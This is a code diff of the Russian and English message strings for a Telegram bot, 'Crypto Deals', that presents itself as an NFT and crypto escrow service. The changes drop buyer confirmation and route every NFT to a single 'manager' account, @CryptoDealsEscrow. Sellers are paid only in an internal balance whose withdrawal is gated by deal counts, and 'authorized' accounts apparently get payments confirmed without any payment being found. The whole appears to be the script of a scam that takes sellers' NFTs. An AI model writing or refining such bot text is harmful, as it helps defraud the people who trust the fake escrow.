@@ -57,8 +57,7 @@ TEXTS = {
         'btn_deal_card': "💳На карту",
         'btn_deal_stars': "⭐️Звезды",
         'enter_amount': "💼 Создание сделки\n\nВведите сумму {unit} в формате: 100.5",
-        'enter_description': "📝 Опишите, что вы продаёте (обязательно укажите ссылку на NFT):\n\nПример: Продаю редкого пепе, ссылка: t.me/nft/PlushPepe-1",
-        'invalid_description_no_link': "❌ В описании обязательно должна быть ссылка на NFT (http://, https:// или t.me/). Пожалуйста, добавьте ссылку и отправьте описание снова.",
+        'enter_description': "📝 Укажите, что вы предлагаете в этой сделке за {amount} {unit}:\n\nПример: 10 Кепок и Пепе...",
         'invalid_amount': "❌ Некорректный формат суммы. Используйте формат 100.5 {unit}",
         'deal_created': (
             "✅ Сделка успешно создана!\n\n"
@@ -74,18 +73,15 @@ TEXTS = {
         'my_balance': (
             "💰 ВАШ БАЛАНС\n\n"
             "👤 Пользователь: @{username}\n"
-            "💵 Рублевый баланс: {balance:.2f} руб\n"
-            "⭐️ Звёздный баланс: {stars_balance:.2f} ⭐️\n\n"
+            "💵 Баланс: {balance:.2f} руб\n\n"
             "💳 Информация о выводе средств:\n"
             "{wallet_info}\n"
             "{card_info}\n\n"
             "📋 **Информация:**\n"
             "• Комиссия системы: {fee}%\n"
-            "• Мин. сумма вывода в рублях: {min_withdraw} руб\n"
-            "• Мин. сумма вывода в звёздах: 1 ⭐️\n"
+            "• Мин. сумма вывода: {min_withdraw} руб\n"
             "{deals_requirement}"
-            "• Вывод рублей доступен на карту или TON-кошелек\n"
-            "• Вывод звёзд производится на Telegram аккаунт (введите @username)\n\n"
+            "• Вывод доступен на карту или TON-кошелек\n\n"
             "💼 Успешных сделок: {deals}"
         ),
         'btn_withdraw': "💳 Вывести средства",
@@ -93,25 +89,17 @@ TEXTS = {
         'withdraw_funds': (
             "💰 ВЫВОД СРЕДСТВ\n\n"
             "💵 Доступно к выводу: {balance:.2f} руб\n"
-            "⭐️ Доступно звёзд: {stars_balance:.2f} ⭐️\n"
-            "📋 Мин. сумма вывода в рублях: {min_withdraw} руб\n"
+            "📋 Мин. сумма: {min_withdraw} руб\n"
             "{deals_requirement}"
             "Выберите способ вывода:"
         ),
         'btn_withdraw_card': "💳 На карту",
         'btn_withdraw_wallet': "🪙 На TON-кошелек",
-        'btn_withdraw_stars': "⭐️ Звёзды на Telegram",
         'insufficient_balance': (
             "❌ НЕДОСТАТОЧНО СРЕДСТВ ДЛЯ ВЫВОДА!\n\n"
             "💵 Ваш баланс: {balance:.2f} руб\n"
             "💰 Мин. сумма вывода: {min_withdraw} руб\n"
             "💸 Не хватает: {need:.2f} руб"
-        ),
-        'insufficient_stars_balance': (
-            "❌ НЕДОСТАТОЧНО ЗВЁЗД ДЛЯ ВЫВОДА!\n\n"
-            "⭐️ Ваш звёздный баланс: {stars_balance:.2f} ⭐️\n"
-            "💰 Мин. сумма вывода: 1 ⭐️\n"
-            "💸 Не хватает: {need:.2f} ⭐️"
         ),
         'withdraw_to_card': (
             "💳 ВЫВОД НА КАРТУ\n\n"
@@ -129,12 +117,6 @@ TEXTS = {
             "💰 Мин. сумма: {min_withdraw} руб\n\n"
             "📝 Введите сумму для вывода в рублях:"
         ),
-        'withdraw_to_stars': (
-            "⭐️ ВЫВОД ЗВЁЗД\n\n"
-            "⭐️ Доступно: {stars_balance:.2f} ⭐️\n"
-            "💰 Мин. сумма: 1 ⭐️\n\n"
-            "📝 Введите сумму для вывода (целое число) и через пробел ваш Telegram username (например: 50 @username):"
-        ),
         'withdraw_immediate': "✅ Вывод сразу (новый пользователь)",
         'withdraw_needed': "⏳ Нужно ещё {needed} сделок",
         'withdraw_available': "✅ Вывод доступен",
@@ -145,7 +127,7 @@ TEXTS = {
             "💼 Ваши успешные сделки: {deals}\n"
             "📊 Требуется: {min_deals}"
         ),
-        'deals_requirement': "• Для вывода рублей необходимо иметь {min_deals} успешных сделок\n",
+        'deals_requirement': "• Для вывода необходимо иметь {min_deals} успешных сделок\n",
         'no_card': "❌ Карта не добавлена",
         'no_wallet': "❌ TON-кошелек не добавлен",
         'withdraw_success': (
@@ -156,15 +138,6 @@ TEXTS = {
             "⏳ Заявка отправлена на обработку администратору.\n"
             "Обычно обработка занимает до 24 часов.\n\n"
             "🏦 Текущий баланс: {balance:.2f} руб\n\n"
-            "📞 При возникновении вопросов обратитесь в поддержку."
-        ),
-        'withdraw_stars_success': (
-            "✅ ЗАЯВКА НА ВЫВОД ЗВЁЗД ПРИНЯТА!\n\n"
-            "⭐️ Сумма: {amount:.0f} ⭐️\n"
-            "📋 Username: {username}\n\n"
-            "⏳ Заявка отправлена на обработку администратору.\n"
-            "Обычно обработка занимает до 24 часов.\n\n"
-            "🏦 Текущий звёздный баланс: {stars_balance:.2f} ⭐️\n\n"
             "📞 При возникновении вопросов обратитесь в поддержку."
         ),
         'withdraw_error': (
@@ -244,7 +217,6 @@ TEXTS = {
         'payment_info_stars': (
             "🏦 Способ оплаты: {currency}\n\n"
             "📝 ID сделки: <code>{deal_id}</code>\n\n"
-            "❗️ После оплаты звёздами, пожалуйста, подтвердите оплату нажатием кнопки ниже."
         ),
         'warning_ton': (
             "⚠️ ВАЖНО: При отправке платежа ОБЯЗАТЕЛЬНО укажите комментарий (мемо) как указано выше!\n\n"
@@ -285,16 +257,15 @@ TEXTS = {
             "1. После успешной оплаты средства будут автоматически зачислены\n"
             "2. Продавец получит уведомление о вашем платеже\n"
             "3. Продавец передаст товар менеджеру\n"
-            "4. После передачи вы получите запрос на подтверждение получения товара\n"
-            "5. После вашего подтверждения средства поступят продавцу\n\n"
+            "4. После проверки вы получите уведомление о завершении сделки\n\n"
             "📞 При возникновении вопросов обратитесь в поддержку."
         ),
         'payment_confirmed_authorized': (
             "✅ Оплата подтверждена! Продавец уведомлен о вашем платеже.\n\n"
-            "⏳ Ожидайте, когда продавец передаст товар менеджеру.\n\n"
+            "⏳ **Ожидайте подтверждения передачи NFT от менеджера...**\n\n"
             "📊 Ваша статистика обновлена:\n"
             "• Успешных сделок: {deals}\n\n"
-            "После передачи менеджеру вы получите уведомление с кнопкой подтверждения получения."
+            "Ожидайте получения товара через менеджера."
         ),
         'payment_confirmation_error': "⚠️ Платеж подтвержден, но возникли проблемы с уведомлениями. Свяжитесь с поддержкой.",
 
@@ -327,13 +298,13 @@ TEXTS = {
             "💎 Товар: {description}\n"
             "💵 Сумма: {amount} {unit}\n\n"
             "📊 **Финансовые условия:**\n"
-            "• Комиссия системы: {fee_percent}%\n"
-            "• К зачислению на баланс после подтверждения покупателем: {net:.2f} {unit}\n\n"
+            "• Комиссия системы: {fee_percent}% ({fee:.2f} руб)\n"
+            "• К зачислению на баланс: {net:.2f} руб\n\n"
             "⚠️ ТРЕБУЕТСЯ ВАШЕ ДЕЙСТВИЕ:\n"
             "1. Передайте товар менеджеру @CryptoDealsEscrow\n"
             "2. После передачи нажмите кнопку ниже\n"
-            "3. Покупатель получит уведомление и подтвердит получение\n"
-            "4. После подтверждения средства поступят на ваш баланс\n\n"
+            "3. Менеджер подтвердит получение NFT\n"
+            "4. Сумма {net:.2f} руб будет зачислена на ваш баланс\n\n"
             "❌ **Не передавайте товар покупателю напрямую!**"
         ),
         'btn_request_transfer': "📦 Подать заявку на передачу NFT",
@@ -344,42 +315,89 @@ TEXTS = {
             "✅ ЗАЯВКА НА ПЕРЕДАЧУ NFT ПОДАНА!\n\n"
             "🔗 Сделка: #{deal_id}\n"
             "📦 Товар: {description}\n"
-            "💰 К зачислению после подтверждения покупателем: {net:.2f} {unit}\n\n"
-            "⏳ Покупатель уведомлен. Ожидайте его подтверждения получения товара."
+            "💰 К зачислению: {net:.2f} руб\n\n"
+            "📞 Менеджеры уведомлены о вашей заявке.\n"
+            "⏳ Ожидайте подтверждения получения NFT от менеджера.\n\n"
+            "ℹ️ Как только менеджер подтвердит получение NFT, сумма {net:.2f} руб будет зачислена на ваш баланс."
         ),
-        'transfer_request_error': "⚠️ Заявка подана, но возникли проблемы с уведомлением покупателя. Свяжитесь с поддержкой.",
+        'transfer_request_error': "⚠️ Заявка подана, но возникли проблемы с уведомлением менеджеров. Свяжитесь с поддержкой.",
 
-        # ---------- Уведомление покупателю о необходимости подтвердить получение ----------
-        'buyer_confirm_receipt': (
-            "📦 ТОВАР ПЕРЕДАН МЕНЕДЖЕРУ!\n\n"
-            "✅ Продавец передал товар менеджеру.\n"
-            "📦 Сделка: #{deal_id}\n"
+        # ---------- Уведомления менеджерам ----------
+        'manager_transfer_request': (
+            "📦 ЗАЯВКА НА ПЕРЕДАЧУ NFT\n\n"
+            "🔗 ID сделки: #{deal_id}\n"
+            "👤 Продавец: @{seller} (ID: {seller_id})\n"
+            "👤 Покупатель: @{buyer}\n"
+            "💰 Сумма: {amount} {unit}\n"
             "💎 Товар: {description}\n\n"
-            "⬇️ **Пожалуйста, подтвердите получение товара от менеджера**, чтобы завершить сделку и перевести средства продавцу."
+            "📊 **Финансовые условия:**\n"
+            "• Комиссия: {fee:.2f} руб ({fee_percent}%)\n"
+            "• К зачислению продавцу: {net:.2f} руб\n\n"
+            "⚠️ **Продавец заявил о передаче NFT.**\n"
+            "Пожалуйста, проверьте получение NFT и подтвердите ниже:"
         ),
-        'btn_confirm_receipt': "✅ Подтвердить получение товара",
+        'btn_manager_confirm': "✅ Подтвердить получение NFT",
+        'btn_manager_reject': "❌ NFT не получен",
 
-        # ---------- Подтверждение покупателем ----------
-        'buyer_receipt_confirmed': (
-            "🎉 СДЕЛКА ЗАВЕРШЕНА!\n\n"
-            "✅ Вы подтвердили получение товара.\n"
-            "💰 Средства продавцу будут зачислены.\n"
-            "📦 Сделка: #{deal_id}\n"
-            "💎 Товар: {description}\n\n"
-            "⭐️ Спасибо за использование Crypto Deals!"
+        # ---------- Подтверждение менеджера ----------
+        'manager_confirmed': (
+            "✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА!\n\n"
+            "🔗 Сделка: #{deal_id}\n"
+            "💰 Зачислено продавцу: {net:.2f} руб\n"
+            "👤 Продавец уведомлен о подтверждении\n"
+            "👤 Покупатель уведомлен о завершении сделки\n\n"
+            "🎉 **Сделка успешно завершена!**"
         ),
-        'seller_funds_credited_after_receipt': (
-            "✅ ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ ТОВАРА!\n\n"
+        'manager_rejected': (
+            "❌ ЗАЯВКА НА ПЕРЕДАЧУ NFT ОТКЛОНЕНА!\n\n"
+            "🔗 Сделка: #{deal_id}\n\n"
+            "⚠️ Продавец уведомлен об отклонении.\n"
+            "Он должен передать NFT и снова подать заявку."
+        ),
+        'manager_action_error': "⚠️ Подтверждение получено, но возникли проблемы с уведомлениями.",
+
+        # ---------- Уведомление покупателю о завершении ----------
+        'buyer_deal_completed': (
+            "🎉 СДЕЛКА ЗАВЕРШЕНА УСПЕШНО!\n\n"
+            "✅ Менеджер подтвердил получение NFT от продавца\n"
+            "👤 Продавец: @{seller}\n"
+            "💰 Сумма: {amount} {unit}\n"
+            "📦 Товар: {description}\n"
+            "🔗 ID сделки: #{deal_id}\n\n"
+            "📢 Ожидайте получения товара от менеджера\n\n"
+            "⭐️ Спасибо за использование Crypto Deals!\n"
+            "Ваша надежность повышена на 1 пункт."
+        ),
+
+        # ---------- Уведомление продавцу о зачислении ----------
+        'seller_funds_credited': (
+            "✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА МЕНЕДЖЕРОМ!\n\n"
             "🔗 Сделка: #{deal_id}\n"
             "📦 Товар: {description}\n"
-            "💰 Сумма сделки: {amount} {unit}\n"
-            "📊 Комиссия системы: {fee:.2f} {unit}\n\n"
+            "💰 Сумма сделки: {amount} руб\n"
+            "📊 Комиссия системы: {fee:.2f} руб\n\n"
             "💰 **СРЕДСТВА ЗАЧИСЛЕНЫ НА ВАШ БАЛАНС!**\n"
-            "💵 Зачислено: {net:.2f} {unit}\n"
-            "🏦 Текущий баланс: {balance} {unit}\n\n"
+            "💵 Зачислено: {net:.2f} руб\n"
+            "🏦 Текущий баланс: {balance:.2f} руб\n\n"
             "🎉 Сделка успешно завершена!\n"
+            "Покупатель уведомлен о завершении сделки.\n\n"
             "⭐️ Спасибо за честную торговлю!\n"
             "Ваша надежность повышена на 1 пункт."
+        ),
+        'btn_back_to_menu': "🏠 Вернуться в главное меню",
+
+        # ---------- Уведомление продавцу об отклонении ----------
+        'seller_transfer_rejected': (
+            "❌ ЗАЯВКА НА ПЕРЕДАЧУ NFT ОТКЛОНЕНА\n\n"
+            "🔗 Сделка: #{deal_id}\n"
+            "📦 Товар: {description}\n\n"
+            "⚠️ **Менеджер не получил NFT!**\n\n"
+            "📌 **Дальнейшие действия:**\n"
+            "1. Передайте NFT менеджеру @CryptoDealsEscrow\n"
+            "2. После передачи снова нажмите 'Подать заявку на передачу NFT'\n"
+            "3. Менеджер подтвердит получение\n"
+            "4. Средства будут зачислены на ваш баланс\n\n"
+            "❌ Не передавайте товар покупателю напрямую!"
         ),
 
         # ---------- Отмена сделки ----------
@@ -398,15 +416,13 @@ TEXTS = {
             "👤 Пользователь: @{username}\n"
             "🆔 ID: {user_id}\n"
             "💼 Успешных сделок: {deals}\n"
-            "💵 Рублевый баланс: {balance:.2f} руб\n"
-            "⭐️ Звёздный баланс: {stars_balance:.2f} ⭐️\n"
+            "💰 Баланс: {balance:.2f} руб\n"
             "🎯 Статус: {status}\n\n"
             "💳 Информация о выводе средств:\n"
             "{wallet_info}\n"
             "{card_info}\n\n"
             "📝 Правила вывода:\n"
-            "• Минимум рублей: {min_withdraw} руб\n"
-            "• Минимум звёзд: 1 ⭐️\n"
+            "• Минимум: {min_withdraw} руб\n"
             "{deals_requirement}"
             "• Комиссия системы: {fee}%\n\n"
             "💡 Доступные функции:\n"
@@ -439,106 +455,418 @@ TEXTS = {
         ),
     },
 
-    # ------------------ АНГЛИЙСКАЯ ВЕРСИЯ (сокращённо, но с ключевыми полями) ------------------
+    # ------------------ АНГЛИЙСКАЯ ВЕРСИЯ ------------------
     LANG_EN: {
-        'welcome': "Welcome 👋\n\n💼 Crypto Deals - We are a specialized service for ensuring the security of over-the-counter transactions.\n\n✨ Automated execution algorithm.\n⚡️ Speed and automation.\n💳 Convenient and fast withdrawal of funds.\n\n• Service fee: 0%\n• Working hours: 24/7\n• Technical support: @CryptoDealsEscrow\n\n🛡️ Choose the desired section below:",
+        'welcome': (
+            "Welcome 👋\n\n"
+            "💼 Crypto Deals - We are a specialized service for ensuring the security of over-the-counter transactions.\n\n"
+            "✨ Automated execution algorithm.\n"
+            "⚡️ Speed and automation.\n"
+            "💳 Convenient and fast withdrawal of funds.\n\n"
+            "• Service fee: 0%\n"
+            "• Working hours: 24/7\n"
+            "• Technical support: @CryptoDealsEscrow\n\n"
+            "🛡️ Choose the desired section below:"
+        ),
         'choose_language': "🌐 Please choose your language:",
         'language_selected': "✅ Language set: English",
         'back_to_menu': "🔙 Back to menu",
+
         'btn_manage_requisites': "📩Manage requisites",
         'btn_create_deal': "📝Create deal",
         'btn_my_balance': "💰My balance",
         'btn_referral': "🔗Referral system",
         'btn_support': "📞Support",
+
         'manage_requisites': "📥 Manage requisites\n\nUse the buttons below to add/change requisites👇",
         'btn_add_wallet': "🪙Add/change TON Wallet",
         'btn_add_card': "💳Add/change card",
+
         'create_deal_prompt': "💰Choose payment method:",
         'btn_deal_ton': "💎To TON wallet",
         'btn_deal_card': "💳To card",
         'btn_deal_stars': "⭐️Stars",
         'enter_amount': "💼 Creating a deal\n\nEnter amount in {unit} (e.g., 100.5):",
-        'enter_description': "📝 Describe what you are selling (must include NFT link):\n\nExample: Selling rare pepe, link: t.me/nft/PlushPepe-1",
-        'invalid_description_no_link': "❌ Description must contain a link to NFT (http://, https:// or t.me/). Please add a link and send again.",
+        'enter_description': "📝 Describe what you are offering in this deal for {amount} {unit}:\n\nExample: 10 Caps and Pepes...",
         'invalid_amount': "❌ Invalid amount format. Use format like 100.5 {unit}",
-        'deal_created': "✅ Deal successfully created!\n\n💰 Amount: {amount} {unit}\n💱 Currency: {currency}\n📜 Description: {description}\n🔗 Link for buyer:\n{link}\n\nCopy the link and send it to the buyer.",
-        'my_balance': "💰 YOUR BALANCE\n\n👤 User: @{username}\n💵 RUB balance: {balance:.2f} RUB\n⭐️ Stars balance: {stars_balance:.2f} ⭐️\n\n💳 Withdrawal info:\n{wallet_info}\n{card_info}\n\n📋 **Information:**\n• System fee: {fee}%\n• Min RUB withdrawal: {min_withdraw} RUB\n• Min Stars withdrawal: 1 ⭐️\n{deals_requirement}• RUB withdrawal to card or TON wallet\n• Stars withdrawal to Telegram account (enter @username)\n\n💼 Successful deals: {deals}",
+        'deal_created': (
+            "✅ Deal successfully created!\n\n"
+            "💰 Amount: {amount} {unit}\n"
+            "💱 Currency: {currency}\n"
+            "📜 Description: {description}\n"
+            "🔗 Link for buyer:\n"
+            "{link}\n\n"
+            "Copy the link and send it to the buyer."
+        ),
+
+        'my_balance': (
+            "💰 YOUR BALANCE\n\n"
+            "👤 User: @{username}\n"
+            "💵 Balance: {balance:.2f} RUB\n\n"
+            "💳 Withdrawal information:\n"
+            "{wallet_info}\n"
+            "{card_info}\n\n"
+            "📋 **Information:**\n"
+            "• System fee: {fee}%\n"
+            "• Min withdrawal: {min_withdraw} RUB\n"
+            "{deals_requirement}"
+            "• Withdrawal available to card or TON wallet\n\n"
+            "💼 Successful deals: {deals}"
+        ),
         'btn_withdraw': "💳 Withdraw funds",
         'btn_history': "📊 Transaction history",
-        'withdraw_funds': "💰 WITHDRAWAL\n\n💵 Available RUB: {balance:.2f} RUB\n⭐️ Available Stars: {stars_balance:.2f} ⭐️\n📋 Min RUB withdrawal: {min_withdraw} RUB\n{deals_requirement}Choose withdrawal method:",
+        'withdraw_funds': (
+            "💰 WITHDRAWAL\n\n"
+            "💵 Available: {balance:.2f} RUB\n"
+            "📋 Min amount: {min_withdraw} RUB\n"
+            "{deals_requirement}"
+            "Choose withdrawal method:"
+        ),
         'btn_withdraw_card': "💳 To card",
         'btn_withdraw_wallet': "🪙 To TON wallet",
-        'btn_withdraw_stars': "⭐️ Stars to Telegram",
-        'insufficient_balance': "❌ INSUFFICIENT RUB BALANCE!\n\n💵 Your balance: {balance:.2f} RUB\n💰 Min withdrawal: {min_withdraw} RUB\n💸 Needed: {need:.2f} RUB",
-        'insufficient_stars_balance': "❌ INSUFFICIENT STARS!\n\n⭐️ Your stars balance: {stars_balance:.2f} ⭐️\n💰 Min withdrawal: 1 ⭐️\n💸 Needed: {need:.2f} ⭐️",
-        'withdraw_to_card': "💳 WITHDRAW TO CARD\n\n🏦 Card: <code>{card}</code>\n📊 Status: {status_text}\n💵 Available: {balance:.2f} RUB\n💰 Min amount: {min_withdraw} RUB\n\n📝 Enter amount in RUB:",
-        'withdraw_to_wallet': "🪙 WITHDRAW TO TON WALLET\n\n🏦 Wallet: <code>{wallet}</code>\n📊 Status: {status_text}\n💵 Available: {balance:.2f} RUB\n💰 Min amount: {min_withdraw} RUB\n\n📝 Enter amount in RUB:",
-        'withdraw_to_stars': "⭐️ WITHDRAW STARS\n\n⭐️ Available: {stars_balance:.2f} ⭐️\n💰 Min amount: 1 ⭐️\n\n📝 Enter amount and your Telegram username (e.g., 50 @username):",
+        'insufficient_balance': (
+            "❌ INSUFFICIENT BALANCE FOR WITHDRAWAL!\n\n"
+            "💵 Your balance: {balance:.2f} RUB\n"
+            "💰 Min withdrawal: {min_withdraw} RUB\n"
+            "💸 Needed: {need:.2f} RUB"
+        ),
+        'withdraw_to_card': (
+            "💳 WITHDRAW TO CARD\n\n"
+            "🏦 Card: <code>{card}</code>\n"
+            "📊 Status: {status_text}\n"
+            "💵 Available: {balance:.2f} RUB\n"
+            "💰 Min amount: {min_withdraw} RUB\n\n"
+            "📝 Enter amount to withdraw in RUB:"
+        ),
+        'withdraw_to_wallet': (
+            "🪙 WITHDRAW TO TON WALLET\n\n"
+            "🏦 Wallet: <code>{wallet}</code>\n"
+            "📊 Status: {status_text}\n"
+            "💵 Available: {balance:.2f} RUB\n"
+            "💰 Min amount: {min_withdraw} RUB\n\n"
+            "📝 Enter amount to withdraw in RUB:"
+        ),
         'withdraw_immediate': "✅ Immediate withdrawal (new user)",
         'withdraw_needed': "⏳ Need {needed} more deals",
         'withdraw_available': "✅ Withdrawal available",
-        'withdraw_deficit': "⏳ YOU NEED {needed} MORE SUCCESSFUL DEALS TO WITHDRAW RUB\n\n💵 Your RUB balance: {balance:.2f} RUB\n💰 Min withdrawal: {min_withdraw} RUB\n💼 Your successful deals: {deals}\n📊 Required: {min_deals}",
-        'deals_requirement': "• You need {min_deals} successful deals to withdraw RUB\n",
+        'withdraw_deficit': (
+            "⏳ YOU NEED {needed} MORE SUCCESSFUL DEALS TO WITHDRAW\n\n"
+            "💵 Your balance: {balance:.2f} RUB\n"
+            "💰 Min withdrawal: {min_withdraw} RUB\n"
+            "💼 Your successful deals: {deals}\n"
+            "📊 Required: {min_deals}"
+        ),
+        'deals_requirement': "• You need {min_deals} successful deals to withdraw\n",
         'no_card': "❌ Card not added",
         'no_wallet': "❌ TON wallet not added",
-        'withdraw_success': "✅ WITHDRAWAL REQUEST ACCEPTED!\n\n💵 Amount: {amount:.2f} RUB\n📋 Method: {method}\n📝 Details: {details}\n\n⏳ Request sent to admin.\nUsually processing takes up to 24 hours.\n\n🏦 Current balance: {balance:.2f} RUB\n\n📞 If you have questions, contact support.",
-        'withdraw_stars_success': "✅ STARS WITHDRAWAL REQUEST ACCEPTED!\n\n⭐️ Amount: {amount:.0f} ⭐️\n📋 Username: {username}\n\n⏳ Request sent to admin.\nUsually processing takes up to 24 hours.\n\n🏦 Current stars balance: {stars_balance:.2f} ⭐️\n\n📞 If you have questions, contact support.",
-        'withdraw_error': "❌ **WITHDRAWAL ERROR!**\n\nPlease try again later or contact support.",
+        'withdraw_success': (
+            "✅ WITHDRAWAL REQUEST ACCEPTED!\n\n"
+            "💵 Amount: {amount:.2f} RUB\n"
+            "📋 Method: {method}\n"
+            "📝 Details: {details}\n\n"
+            "⏳ Request sent to admin for processing.\n"
+            "Usually processing takes up to 24 hours.\n\n"
+            "🏦 Current balance: {balance:.2f} RUB\n\n"
+            "📞 If you have questions, contact support."
+        ),
+        'withdraw_error': (
+            "❌ **WITHDRAWAL ERROR!**\n\n"
+            "Please try again later or contact support."
+        ),
         'transaction_history': "📊 **TRANSACTION HISTORY**\n\nSection under development.",
-        'add_wallet_prompt': "🔑 Add your TON wallet:\n\nSend your wallet address\n\n📝 Important:\n• Min withdrawal: {min_withdraw} RUB",
-        'add_wallet_change': "🔑 Your current TON wallet:\n<code>{wallet}</code>\n\n📊 Status: {status}\n\nSend new address to change.\n\n📝 Withdrawal rules:\n• Min withdrawal: {min_withdraw} RUB",
-        'add_card_prompt': "💳 Add your card:\n\nSend your card number\n\n📝 Important:\n• Min withdrawal: {min_withdraw} RUB",
-        'add_card_change': "💳 Your current card:\n<code>{card}</code>\n\n📊 Status: {status}\n\nSend new card number to change.\n\n📝 Withdrawal rules:\n• Min withdrawal: {min_withdraw} RUB",
-        'wallet_saved': "✅ TON wallet saved!\n\n🔑 Wallet: <code>{wallet}</code>\n\n📝 Info:\n• Min withdrawal: {min_withdraw} RUB\n• Fee: {fee}%\n\n💼 Your successful deals: {deals}",
-        'card_saved': "✅ Card saved!\n\n💳 Card: <code>{card}</code>\n\n📝 Info:\n• Min withdrawal: {min_withdraw} RUB\n• Fee: {fee}%\n\n💼 Your successful deals: {deals}",
-        'invalid_wallet': "❌ Invalid wallet format.",
-        'invalid_card': "❌ Invalid card number.",
-        'deal_info_buyer': "💳 Deal #{deal_id}\n\n👤 You are the buyer.\n📌 Seller: @{seller}\n\n📦 You are buying: {description}\n\n{payment_info}💰 Amount: {amount} {unit}\n\n{warning}",
-        'payment_info_ton': "🏦 Payment address:\n<code>{wallet}</code>\n\n📝 Memo:\n<code>{deal_id}</code>\n\n",
-        'payment_info_card': "🏦 Card:\n<code>{card}</code>\n\n📝 Reference:\n<code>{deal_id}</code>\n\n",
-        'payment_info_stars': "🏦 Payment method: {currency}\n\n📝 Deal ID: <code>{deal_id}</code>\n\n❗️ After payment, press confirm.",
-        'warning_ton': "⚠️ IMPORTANT: Include memo!\n\n❌ Without memo payment won't be credited.",
-        'warning_card': "⚠️ IMPORTANT: Include reference!\n\n❌ Without reference payment won't be credited.",
-        'warning_stars': "⚠️ Follow seller's payment instructions.\nSave the deal ID!",
+
+        'add_wallet_prompt': (
+            "🔑 Add your TON wallet:\n\n"
+            "Please send your wallet address\n\n"
+            "📝 Important:\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB"
+        ),
+        'add_wallet_change': (
+            "🔑 Your current TON wallet:\n<code>{wallet}</code>\n\n"
+            "📊 Status: {status}\n\n"
+            "Send new wallet address to change or press button below to return to menu.\n\n"
+            "📝 **Withdrawal rules:**\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB"
+        ),
+        'add_card_prompt': (
+            "💳 Add your card:\n\n"
+            "Please send your card number\n\n"
+            "📝 **Important:**\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB"
+        ),
+        'add_card_change': (
+            "💳 Your current card number:\n<code>{card}</code>\n\n"
+            "📊 Status: {status}\n\n"
+            "Send new card number to change or press button below to return to menu.\n\n"
+            "📝 **Withdrawal rules:**\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB"
+        ),
+        'wallet_saved': (
+            "✅ TON wallet successfully saved!\n\n"
+            "🔑 Your current TON wallet:\n<code>{wallet}</code>\n\n"
+            "📝 **Withdrawal information:**\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB\n"
+            "• System fee: {fee}%\n\n"
+            "💼 Your successful deals: {deals}"
+        ),
+        'card_saved': (
+            "✅ Card number successfully saved!\n\n"
+            "💳 Your current card number:\n<code>{card}</code>\n\n"
+            "📝 **Withdrawal information:**\n"
+            "• Minimum withdrawal amount: {min_withdraw} RUB\n"
+            "• System fee: {fee}%\n\n"
+            "💼 Your successful deals: {deals}"
+        ),
+        'invalid_wallet': "❌ Invalid wallet format. Please check the address and try again.",
+        'invalid_card': "❌ Invalid card number format. Please check the number and try again.",
+
+        'deal_info_buyer': (
+            "💳 Deal information #{deal_id}\n\n"
+            "👤 You are the buyer in this deal.\n"
+            "📌 Seller: @{seller}\n\n"
+            "📦 You are buying: {description}\n\n"
+            "{payment_info}\n"
+            "💰 Amount to pay: {amount} {unit}\n\n"
+            "{warning}"
+        ),
+        'payment_info_ton': (
+            "🏦 Payment address:\n"
+            "<code>{wallet}</code>\n\n"
+            "📝 Memo:\n"
+            "<code>{deal_id}</code>\n\n"
+        ),
+        'payment_info_card': (
+            "🏦 Card number for payment:\n"
+            "<code>{card}</code>\n\n"
+            "📝 Payment reference:\n"
+            "<code>{deal_id}</code>\n\n"
+        ),
+        'payment_info_stars': (
+            "🏦 Payment method: {currency}\n\n"
+            "📝 Deal ID: <code>{deal_id}</code>\n\n"
+        ),
+        'warning_ton': (
+            "⚠️ IMPORTANT: When sending payment, you MUST include the memo as above!\n\n"
+            "📌 Payment instructions:\n"
+            "1. Copy TON wallet address\n"
+            "2. Copy memo\n"
+            "3. Send exact amount {amount} TON\n"
+            "4. Paste memo in 'Memo' field\n\n"
+            "❌ WITHOUT MEMO PAYMENT WILL NOT BE CREDITED!\n"
+            "If you make a mistake, contact @CryptoDealsEscrow"
+        ),
+        'warning_card': (
+            "⚠️ IMPORTANT: When transferring, you MUST include the payment reference as above!\n\n"
+            "📌 Payment instructions:\n"
+            "1. Copy card number\n"
+            "2. Copy payment reference\n"
+            "3. Send exact amount {amount} RUB\n"
+            "4. Paste reference in 'Payment reference' / 'Comment' field\n\n"
+            "❌ WITHOUT CORRECT REFERENCE PAYMENT WILL NOT BE CREDITED!\n"
+            "If you have problems, contact support — @CryptoDealsEscrow"
+        ),
+        'warning_stars': (
+            "⚠️ Please follow seller's payment instructions.\n"
+            "Save the deal ID for confirmation!\n\n"
+            "If you have problems, contact support — @CryptoDealsEscrow"
+        ),
         'btn_confirm_payment': "✅ Confirm payment",
         'btn_exit_deal': "❌ Exit deal",
-        'payment_confirmed_unauthorized': "⏳ PAYMENT UNDER VERIFICATION\n\n✅ You pressed confirm.\n💰 Amount: {amount} {unit}\n📦 Item: {description}\n🔗 Deal: #{deal_id}\n\n❌ Payment not found\n⏳ Wait 10 min.\n\n📞 Contact support if issues.",
-        'payment_confirmed_authorized': "✅ Payment confirmed! Seller notified.\n\n⏳ Waiting for seller to transfer item.\n\n📊 Your stats updated: {deals} successful deals.",
-        'payment_confirmation_error': "⚠️ Payment confirmed but notification issues. Contact support.",
-        'seller_deal_info': "📋 Your deal #{deal_id}\n\n📊 Your successful deals: {deals}\n\n📦 Offer: {description}\n💰 Amount: {amount} {unit}\n💱 Currency: {currency}\n\n🔗 Link for buyer:\n{link}\n\nℹ️ When buyer joins, you'll be notified.",
-        'new_buyer_notification': "👤 User @{buyer}\nJoined deal #{deal_id}\n\n{buyer_stats}\n\n⚠️ Verify user.",
+        'payment_confirmed_unauthorized': (
+            "⏳ PAYMENT UNDER VERIFICATION\n\n"
+            "✅ You pressed the payment confirmation button.\n"
+            "💰 Amount: {amount} {unit}\n"
+            "📦 Item: {description}\n"
+            "🔗 Deal ID: #{deal_id}\n\n"
+            "❌ **Payment not found**\n"
+            "⏳ **Please wait for payment confirmation within 10 minutes.**\n\n"
+            "📌 **Next steps:**\n"
+            "1. After successful payment, funds will be automatically credited\n"
+            "2. Seller will be notified of your payment\n"
+            "3. Seller will transfer item to manager\n"
+            "4. After verification you will receive deal completion notification\n\n"
+            "📞 If you have questions, contact support."
+        ),
